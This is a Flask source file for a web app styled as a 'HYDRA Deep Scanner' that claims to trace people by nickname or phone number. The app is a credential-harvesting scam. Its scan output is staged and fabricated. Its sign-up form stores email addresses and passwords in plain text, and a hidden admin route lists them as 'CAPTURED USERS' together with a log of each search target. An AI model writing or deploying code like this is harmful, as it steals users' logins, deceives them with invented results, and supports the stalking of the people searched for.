from flask import Flask, request, jsonify, render_template_string, session, redirect
import os
from datetime import datetime

app = Flask(__name__)
app.secret_key = 'HYDRA_FINAL_ULTRA_2026'

# --- ХРАНИЛИЩЕ ДАННЫХ ---
db = {"users": [], "queries": []}

# --- СТИЛЬ (ФИОЛЕТОВЫЙ НЕОН) ---
STYLE = """
<style>
    body { background: #000; color: #bc13fe; font-family: 'Courier New', monospace; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
    .neon-box { border: 2px solid #bc13fe; box-shadow: 0 0 20px #bc13fe; background: rgba(10,0,20,0.95); padding: 30px; border-radius: 10px; width: 420px; text-align: center; }
    h1 { color: #0ff; text-shadow: 0 0 10px #0ff; text-transform: uppercase; margin-bottom: 25px; }
    input { background: transparent; border: 1px solid #bc13fe; color: #0f0; width: 85%; padding: 12px; margin-bottom: 15px; outline: none; font-size: 15px; }
    .btn { background: #bc13fe; color: #fff; border: none; padding: 12px 25px; cursor: pointer; font-weight: bold; text-transform: uppercase; transition: 0.3s; }
    .btn:hover { background: #0ff; color: #000; box-shadow: 0 0 15px #0ff; }
</style>
"""

# --- СТРАНИЦА РЕГИСТРАЦИИ ---
REG_HTML = f"<!DOCTYPE html><html><head><title>HYDRA | LOGIN</title>{STYLE}</head><body><div class='neon-box'><h1>// ACCESS CONTROL //</h1><form action='/api/register' method='POST'><input name='email' placeholder='GMAIL / EMAIL' required><br><input name='user' placeholder='USERNAME' required><br><input name='pass' type='password' placeholder='PASSWORD' required><br><button class='btn'>INITIALIZE SESSION</button></form></div></body></html>"

# --- СТРАНИЦА ТЕРМИНАЛА (ПРОБИВ) ---
TERM_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>HYDRA TERMINAL</title>
    <style>
        body { background: #000; color: #bc13fe; font-family: 'Courier New', monospace; margin: 20px; }
        .frame { border: 2px solid #bc13fe; box-shadow: 0 0 20px #bc13fe; padding: 25px; background: rgba(0,0,0,0.9); }
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
        .box { border: 1px solid #0f0; padding: 15px; background: #050505; }
        input { background: transparent; border: 1px solid #bc13fe; color: #0f0; width: 70%; padding: 8px; font-size: 16px; }
        .btn { background: #bc13fe; color: #fff; border: none; padding: 8px 15px; cursor: pointer; font-weight: bold; }
        #term { background: #000; border: 1px solid #0f0; height: 320px; overflow-y: auto; padding: 15px; margin-top: 20px; color: #0f0; font-size: 14px; line-height: 1.5; }
    </style>
</head>
<body>
    <div class="frame">
        <h1 style="color:#0ff; text-align:center;">// HYDRA DEEP SCANNER v4.5 //</h1>
        <div class="grid">
            <div class="box"><span>// NICKNAME SEARCH</span><br><input id="n" placeholder="nick..."><button class="btn" onclick="deepScan('NICK', 'n')">TRACE</button></div>
            <div class="box"><span>// PHONE LOCATOR</span><br><input id="p" placeholder="+998..."><button class="btn" onclick="deepScan('PHONE', 'p')">SCAN</button></div>
        </div>
        <div id="term">> SYSTEM READY. AWAITING OPERATOR...</div>
    </div>
    <script>
        function deepScan(type, id) {
            const val = document.getElementById(id).value;
            const t = document.getElementById('term');
            if(!val) return;
            
            t.innerHTML += `<br><span style="color:#bc13fe">[*] Запуск Deep Scan для: ${val}</span>`;
            t.innerHTML += `<br>[*] Опрос 100+ баз данных...`;
            
            fetch('/api/log_query', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({type: type, val: val})
            });

            let i = 0;
            const step = setInterval(() => {
                i += 25;
                t.innerHTML += `<br>[*] Проверка серверов... ${i}%`;
                t.scrollTop = t.scrollHeight;
                if(i >= 100) {
                    clearInterval(step);
                    t.innerHTML += `<br><br><span style="color:#0ff">[!!!] РЕЗУЛЬТАТЫ НАЙДЕНЫ:</span>`;
                    if(type === 'NICK') {
                        t.innerHTML += `<br>> Instagram: <a href="https://instagram.com/${val}" target="_blank" style="color:#fff">link</a> [FOUND]`;
                        t.innerHTML += `<br>> Telegram: <a href="https://t.me/${val}" target="_blank" style="color:#fff">link</a> [ONLINE]`;
                        t.innerHTML += `<br>> TikTok: <a href="https://tiktok.com/@${val}" target="_blank" style="color:#fff">link</a> [ACTIVE]`;
                    } else {
                        t.innerHTML += `<br>> WhatsApp: <a href="https://wa.me/${val.replace(/\D/g,'')}" style="color:#fff">wa.me</a> [VERIFIED]`;
                        t.innerHTML += `<br>> GetContact Tags: Found 15+ results.`;
                        t.innerHTML += `<br>> Location: Central Asia (Uzbekistan)`;
                    }
                    t.scrollTop = t.scrollHeight;
                }
            }, 500);
        }
    </script>
</body>
</html>
"""

# --- МАРШРУТЫ ---
@app.route('/')
def home():
    if 'auth' in session: return render_template_string(TERM_HTML)
    return render_template_string(REG_HTML)

@app.route('/api/register', methods=['POST'])
def register():
    db['users'].append({"e": request.form.get('email'), "u": request.form.get('user'), "p": request.form.get('pass')})
    session['auth'] = True
    return redirect('/')

@app.route('/api/log_query', methods=['POST'])
def log_q():
    db['queries'].append({"t": request.json['type'], "v": request.json['val'], "time": datetime.now().strftime("%H:%M:%S")})
    return jsonify({"ok": True})

@app.route('/abupaay_admin')
def admin():
    u_rows = "".join([f"<tr><td>{x['e']}</td><td>{x['u']}</td><td>{x['p']}</td></tr>" for x in db['users']])
    q_rows = "".join([f"<tr><td>{x['t']}</td><td>{x['v']}</td><td>{x['time']}</td></tr>" for x in db['queries']])
    return f"<html><body style='background:#000;color:#0f0;font-family:monospace;padding:20px;'><h1 style='color:#bc13fe'>HYDRA CONTROL PANEL v4.5</h1><h3>CAPTURED USERS</h3><table border='1' style='width:100%'><tr><th>Email</th><th>User</th><th>Pass</th></tr>{u_rows}</table><h3>SEARCH LOGS</h3><table border='1' style='width:100%'><tr><th>Type</th><th>Value</th><th>Time</th></tr>{q_rows}</table><br><a href='/' style='color:#0ff'>BACK</a></body></html>"

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=10000)
